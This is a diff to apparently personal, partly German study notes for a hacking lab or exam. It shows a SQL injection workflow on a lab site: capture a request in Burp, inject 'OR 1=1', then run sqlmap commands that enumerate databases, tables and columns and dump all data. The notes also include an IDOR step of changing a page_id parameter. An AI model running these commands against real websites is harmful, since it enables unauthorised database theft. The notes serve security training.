@@ -135,12 +135,15 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value; ui-
 #013 Exploit Website
 nmap -sV --script=http-enum target IP
 find input parameter with burp
+Im Request Feld
+rechtsklick "save item"
+save as req.text
 intercept with parameter 1 oder 1 OR 1=1 #
 safe file in Burp als *.txt
-sqlmap -r txt from Burp --dbs
-sqlmap -r txt from Burp -D database name --tables
-sqlmap -r txt from Burp -D database name -T table name --columns
-sqlmap -r txt from Burp -D database name -T table name --dump-all
+sqlmap -r req.text --dbs
+sqlmap -r req.text -D database name --tables
+sqlmap -r req.text -D database name -T table name --columns
+sqlmap -r req.text -D database name -T table name --dump-all
 login to page and change url parameter page_id=1 to page_id=84
 
 #014 Vuln Research DVWA Upload/File inclusion
